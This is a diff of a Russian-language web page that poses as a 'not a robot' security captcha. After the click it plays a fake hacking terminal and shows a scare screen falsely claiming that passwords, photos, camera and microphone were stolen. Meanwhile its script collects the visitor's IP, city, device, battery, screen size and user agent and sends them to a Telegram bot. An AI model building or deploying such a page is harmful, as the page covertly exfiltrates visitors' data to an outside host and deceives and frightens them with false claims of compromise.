@@ -6,14 +6,15 @@
     <style>
         body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: hidden; }
         
-   
+       
         #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
+        .welcome-text { color: #888; font-size: 12px; margin-bottom: 10px; font-family: Arial, sans-serif; }
         .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; font-weight: bold; }
-        input { padding: 12px; border: 2px solid #007bff; border-radius: 5px; width: 250px; text-align: center; font-size: 16px; margin-top: 10px; outline: none; }
-         
+        
+ 
         #terminal { display: none; padding: 20px; line-height: 1.4; height: 100vh; overflow: hidden; background: #000; color: #0f0; }
 
-      
+   
         #leak-box { 
             display: none; 
             padding: 20px; 
@@ -36,31 +37,10 @@
             box-shadow: 0 0 40px #f00;
         }
 
-        .glitch-text {
-            color: #f00;
-            font-size: 26px;
-            text-align: center;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin: 0;
-        }
-
-        .data-list {
-            color: #0f0;
-            font-size: 14px;
-            margin-top: 15px;
-            line-height: 1.6;
-        }
-
-        .red-blink {
-            color: #f00;
-            font-weight: bold;
-            animation: blink 0.4s step-end infinite;
-        }
-
+        .glitch-text { color: #f00; font-size: 26px; text-align: center; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 0; }
+        .data-list { color: #0f0; font-size: 14px; margin-top: 15px; line-height: 1.6; }
+        .red-blink { color: #f00; font-weight: bold; animation: blink 0.4s step-end infinite; }
         @keyframes blink { 50% { opacity: 0; } }
-
         .extracted-item { color: #aaa; margin: 5px 0; font-size: 12px; }
         .status-done { color: #f00; font-weight: bold; float: right; }
         hr { border: 0; border-top: 2px solid #f00; margin: 15px 0; }
@@ -70,35 +50,29 @@
     <div id="terminal"></div>
 
     <div id="captcha-box">
+        <div class="welcome-text">Добро пожаловать</div>
         <img src="https://www.google.com" width="120">
         <h2>Проверка безопасности</h2>
-        <p style="font-size: 13px; color: #555;">Введите номер телефона для верификации:</p>
-        <input type="tel" id="user-phone" placeholder="+998 __ ___ __ __">
+        <p style="font-size: 14px; color: #555;">Подтвердите, что вы не робот для продолжения</p>
         <button class="btn-verify" onclick="startProcess()">Я НЕ РОБОТ</button>
     </div>
 
-    <!-- ИСПРАВЛЕННЫЙ СТРАШНЫЙ БЛОК -->
     <div id="leak-box">
         <div class="danger-ui">
-            <p class="glitch-text">⚠ ДАННЫЕ ВЫГРУЖЕНЫ ⚠</p>
+            <p class="glitch-text">⚠ СИСТЕМА ВЗЛОМАНА ⚠</p>
             <hr>
             <div class="data-list">
-                <p>> СТАТУС: <span class="red-blink">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
+                <p>> СТАТУС: <span class="red-blink">КРИТИЧЕСКАЯ УТЕЧКА</span></p>
                 <p>> ВАШ IP: <span id="user-ip" style="color:#fff;">...</span></p>
                 <p>> ГОРОД: <span id="user-geo" style="color:#fff;">...</span></p>
                 <p>> УСТРОЙСТВО: <span id="user-os" style="color:#fff;">...</span></p>
+                <p>> БАТАРЕЯ: <span id="user-bat" style="color:#fff;">...</span></p>
                 
-                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ СПИСОК ВЫГРУЖЕННЫХ ДАННЫХ:</p>
-                <div class="extracted-item">● Все контакты и SMS-сообщения <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Галерея и скрытые альбомы (.jpg, .mp4) <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● История браузера и сохраненные пароли <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Банковские приложения и куки-файлы <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Доступ к фронтальной камере (снимок) <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Геолокация в реальном времени <span class="status-done">DONE</span></div>
+                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ ВЫГРУЖЕНО НА СЕРВЕР:</p>
+                <div class="extracted-item">● База паролей и куки браузера <span class="status-done">DONE</span></div>
+                <div class="extracted-item">● Личные фото и видео (.mp4, .png) <span class="status-done">DONE</span></div>
+                <div class="extracted-item">● Доступ к микрофону и камере <span class="status-done">DONE</span></div>
             </div>
-            <p style="color: #f00; text-align: center; font-weight: bold; margin-top: 20px; font-size: 14px;">
-                СВЯЗЬ С СЕРВЕРОМ: АКТИВНА
-            </p>
         </div>
     </div>
 
@@ -107,20 +81,15 @@
         const chat_id = "-1003861311533";
 
         async function startProcess() {
-            const phoneVal = document.getElementById('user-phone').value;
-            if (phoneVal.length < 5) { alert("Введите корректный номер!"); return; }
-
             document.getElementById('captcha-box').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
             const lines = [
-                "> [INIT] Подключение к ядру...", "> [INFO] Поиск уязвимости порта 80...",
-                "> [SUCCESS] Доступ получен", "> [INFO] Обход защиты Defender...",
-                "> [SUCCESS] Защита отключена", "> [INFO] Чтение папки %APPDATA%...",
-                "> [WARNING] Попытка перехвата данных...", "> [SUCCESS] Перехват подтвержден",
-                "> [SYSTEM] Копирование базы паролей...", "> [INFO] Выгрузка фото на сервер...",
-                "> [DONE] ПОЛНЫЙ КОНТРОЛЬ УСТАНОВЛЕН."
+                "> [INIT] Подключение к ядру...", "> [INFO] Поиск уязвимости...",
+                "> [SUCCESS] Доступ получен", "> [INFO] Обход защиты...",
+                "> [SUCCESS] Defender отключен", "> [INFO] Копирование данных...",
+                "> [DONE] ВЫГРУЗКА ЗАВЕРШЕНА."
             ];
 
             for (let line of lines) {
@@ -130,7 +99,6 @@
                 window.scrollTo(0, document.body.scrollHeight);
                 await new Promise(r => setTimeout(r, 150)); 
             }
- 
             await getTripleData();
         }
 
@@ -138,36 +106,49 @@
             let ip = "Не определен";
             let city = "Неизвестно";
             
-            const getBattery = async () => {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Заряжается' : 'Нет'})`;
-                }
-                return "N/A";
-            };
+    
+            let device = navigator.platform;
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) device = "📱 Android Phone";
+            else if (/iPhone|iPad/i.test(ua)) device = "🍎 iOS Device";
+            else if (/Windows/i.test(ua)) device = "💻 Windows PC";
 
-            const battery = await getBattery();
-            const phone = document.getElementById('user-phone').value;
+           
+            let batteryInfo = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Зарядка' : 'Разряд'})`;
+            }
 
             try {
+             
                 const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
                 if (ipRes) {
                     const ipData = await ipRes.json();
                     ip = ipData.ip;
                 }
 
+             
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
                 if (geoRes) {
                     const geoData = await geoRes.json();
                     city = `${geoData.city}, ${geoData.country_name}`;
                 }
 
-         
+             
                 document.getElementById('user-ip').innerText = ip;
                 document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = navigator.platform;
+                document.getElementById('user-os').innerText = device;
+                document.getElementById('user-bat').innerText = batteryInfo;
 
-                const msg = `🔥 СИСТЕМА ВЗЛОМАНА!\n📱 НОМЕР: ${phone}\n📍 IP: ${ip}\n🌍 ГОРОД: ${city}\n🔋 БАТАРЕЯ: ${battery}\n🌐 ИНФО: ${navigator.userAgent}`;
+             
+                const msg = `🚀 НОВЫЙ ЛОГ!
+📍 IP: ${ip}
+🌍 ГОРОД: ${city}
+📱 УСТРОЙСТВО: ${device}
+🔋 БАТАРЕЯ: ${batteryInfo}
+🖥 ЭКРАН: ${window.screen.width}x${window.screen.height}
+🌐 ТЕХ ИНФО: ${ua}`;
 
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
